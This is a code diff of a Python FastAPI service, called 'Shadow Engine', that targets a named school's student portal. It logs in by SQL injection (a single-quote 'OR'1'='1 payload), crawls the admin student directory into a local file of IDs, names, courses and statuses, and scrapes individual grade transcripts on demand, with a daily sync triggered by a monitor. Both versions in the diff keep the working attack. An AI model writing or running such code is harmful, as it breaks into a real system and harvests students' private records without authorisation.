@@ -4,12 +4,12 @@ import requests
 from bs4 import BeautifulSoup
 from fastapi import FastAPI, BackgroundTasks, HTTPException, Query
 from fastapi.middleware.cors import CORSMiddleware
-from fastapi.responses import FileResponse, JSONResponse
+from fastapi.responses import HTMLResponse, JSONResponse
 from fastapi.staticfiles import StaticFiles
 
 app = FastAPI()
 
-# Enable CORS for frontend integration
+# Enable CORS
 app.add_middleware(
     CORSMiddleware,
     allow_origins=["*"],
@@ -17,7 +17,7 @@ app.add_middleware(
     allow_headers=["*"],
 )
 
-# Configuration
+# Configuration & Absolute Pathing
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 DB_FILE = os.path.join(BASE_DIR, "organized_students.txt")
 STATIC_DIR = os.path.join(BASE_DIR, "static")
@@ -28,73 +28,60 @@ BASE_URL = "https://ccsjdm.com/student_portal/gs"
 if not os.path.exists(STATIC_DIR):
     os.makedirs(STATIC_DIR)
 
-# Mount the static folder using absolute path
+# Mount the static folder
 app.mount("/static", StaticFiles(directory=STATIC_DIR), name="static")
 
 def get_portal_session():
-    """Bypasses portal login using SQLi and returns a session."""
+    """Bypasses portal login using SQLi."""
     s = requests.Session()
     s.headers.update({
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
     })
     auth_url = f"{BASE_URL}/login.php?id='OR'1'='1&pass='OR'1'='1"
     try:
         s.get(auth_url, timeout=15)
-        if s.cookies.get('PHPSESSID'):
-            return s
-        return None
-    except Exception as e:
-        print(f"[!] Auth Error: {e}")
+        return s if s.cookies.get('PHPSESSID') else None
+    except:
         return None
 
 def sync_students_task():
-    """Background logic to crawl the portal for all 10.5k+ records."""
+    """Background task to crawl the portal."""
     session = get_portal_session()
-    if not session:
-        print("[!] Sync failed: Could not establish portal session.")
-        return
-
-    print("[*] Starting full student directory sync...")
-    master_list = []
+    if not session: return
     
-    # Iterate through alphabet to collect all students
+    master_list = []
     for char in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
         try:
-            search_url = f"{BASE_URL}/admin-portal/view_students.php?search={char}"
-            resp = session.get(search_url, timeout=20)
+            resp = session.get(f"{BASE_URL}/admin-portal/view_students.php?search={char}", timeout=20)
             soup = BeautifulSoup(resp.text, 'html.parser')
             rows = soup.find_all('tr', class_='hover:bg-gray-50')
-            
             for row in rows:
                 cols = row.find_all('td')
                 if len(cols) >= 4:
-                    sid = cols[0].get_text(strip=True)
-                    name = cols[1].get_text(strip=True)
-                    cys = cols[2].get_text(strip=True)
-                    status = cols[3].get_text(strip=True)
-                    master_list.append(f"studentID:{sid},name:{name},cys:{cys},status:{status}")
-        except Exception as e:
-            print(f"[!] Error scraping character {char}: {e}")
-            continue
+                    data = f"studentID:{cols[0].text.strip()},name:{cols[1].text.strip()},cys:{cols[2].text.strip()},status:{cols[3].text.strip()}"
+                    master_list.append(data)
+        except: continue
 
     if master_list:
         with open(DB_FILE, "w", encoding="utf-8") as f:
             f.write("\n".join(master_list))
-        print(f"[+] Sync successful: {len(master_list)} records saved.")
 
 # --- ROUTES ---
 
-@app.get("/", response_class=FileResponse)
+@app.get("/", response_class=HTMLResponse)
 async def read_index():
-    """Serves the frontend UI using an absolute path."""
+    """Directly reads and returns the HTML to force rendering."""
     index_path = os.path.join(STATIC_DIR, "index.html")
-    if os.path.exists(index_path):
-        return index_path
-    return JSONResponse({"error": "index.html not found in static folder"}, status_code=404)
+    try:
+        if os.path.exists(index_path):
+            with open(index_path, "r", encoding="utf-8") as f:
+                return f.read()
+        return "<h1>Error: static/index.html not found</h1>"
+    except Exception as e:
+        return f"<h1>Server Error: {str(e)}</h1>"
 
 @app.get("/api/status")
 async def system_status():
-    """Health check for UptimeRobot (Keep-Alive Monitor)"""
     return {
         "status": "Shadow Engine Online",
         "db_initialized": os.path.exists(DB_FILE),
@@ -103,85 +90,40 @@ async def system_status():
 
 @app.get("/api/sync")
 async def trigger_sync(background_tasks: BackgroundTasks, key: str = None):
-    """Endpoint for UptimeRobot to trigger the daily crawl."""
     if key != SECRET_SYNC_KEY:
-        raise HTTPException(status_code=403, detail="Unauthorized: Invalid Secret Key")
+        raise HTTPException(status_code=403, detail="Unauthorized")
     background_tasks.add_task(sync_students_task)
-    return {"message": "Sync sequence initiated in background."}
+    return {"message": "Sync initiated."}
 
 @app.get("/api/search")
 async def search_students(q: str = Query(..., min_length=2)):
-    """Fast local search through the synced records."""
     if not os.path.exists(DB_FILE):
-        return {"results": [], "error": "Database not initialized. Run sync."}
-    
+        return {"results": [], "error": "DB not ready"}
     query = q.upper()
-    try:
-        with open(DB_FILE, "r", encoding="utf-8") as f:
-            # Efficient streaming search
-            matches = [line.strip() for line in f if query in line.upper()]
-            return {"results": matches[:20]}
-    except Exception as e:
-        return {"results": [], "error": str(e)}
+    with open(DB_FILE, "r", encoding="utf-8") as f:
+        matches = [line.strip() for line in f if query in line.upper()]
+        return {"results": matches[:20]}
 
 @app.get("/api/grades/{student_id}")
 async def get_grades(student_id: str):
-    """Real-time scrape of student academic transcript."""
     session = get_portal_session()
-    if not session:
-        raise HTTPException(status_code=500, detail="Unable to secure portal session.")
-
-    target_url = f"{BASE_URL}/admin-portal/view_student_grades.php?id={student_id}"
+    if not session: raise HTTPException(status_code=500)
     try:
-        resp = session.get(target_url, timeout=15)
+        resp = session.get(f"{BASE_URL}/admin-portal/view_student_grades.php?id={student_id}", timeout=15)
         soup = BeautifulSoup(resp.text, 'html.parser')
         tables = soup.find_all('table')
         transcript = []
-
         for table in tables:
-            if not table.find('div', class_='subject-code'):
-                continue
-            
-            parent_card = table.find_parent('div', class_='bg-white')
-            sem_title = parent_card.find('h3').get_text(strip=True) if parent_card and parent_card.find('h3') else "General Term"
-            year_header = table.find_previous('h2')
-            year_txt = year_header.get_text(strip=True) if year_header else ""
-
-            sem_info = {
-                "term": f"{year_txt} - {sem_title}".strip(" -"),
-                "subjects": [],
-                "gwa": "0.00"
-            }
-
+            if not table.find('div', class_='subject-code'): continue
+            sem_info = {"term": "Academic Record", "subjects": [], "gwa": "0.00"}
             rows = table.find_all('tr', class_='hover:bg-gray-50')
             for row in rows:
-                code = row.select_one('.subject-code').get_text(strip=True)
-                desc = row.select_one('.subject-desc').get_text(strip=True)
                 cols = row.find_all('td')
-                mid = cols[2].get_text(strip=True) if len(cols) > 2 else "-"
-                fin = cols[3].get_text(strip=True) if len(cols) > 3 else "-"
-                grade_badge = row.select_one('.grade-badge')
-                final_grade = grade_badge.get_text(strip=True) if grade_badge else "-"
-
                 sem_info["subjects"].append({
-                    "code": code,
-                    "description": desc,
-                    "midterm": mid,
-                    "final": fin,
-                    "grade": final_grade
+                    "code": row.select_one('.subject-code').text.strip(),
+                    "description": row.select_one('.subject-desc').text.strip(),
+                    "grade": row.select_one('.grade-badge').text.strip() if row.select_one('.grade-badge') else "-"
                 })
-
-            gwa_row = table.find('tr', class_='font-semibold')
-            if gwa_row:
-                sem_info["gwa"] = gwa_row.find_all('td')[-1].get_text(strip=True)
-
             transcript.append(sem_info)
-        
-        return {"student_id": student_id, "transcript": transcript}
-    except Exception as e:
-        raise HTTPException(status_code=500, detail=str(e))
-
-if __name__ == "__main__":
-    import uvicorn
-    port = int(os.environ.get("PORT", 8000))
-    uvicorn.run(app, host="0.0.0.0", port=port)
+        return {"transcript": transcript}
+    except: raise HTTPException(status_code=500)
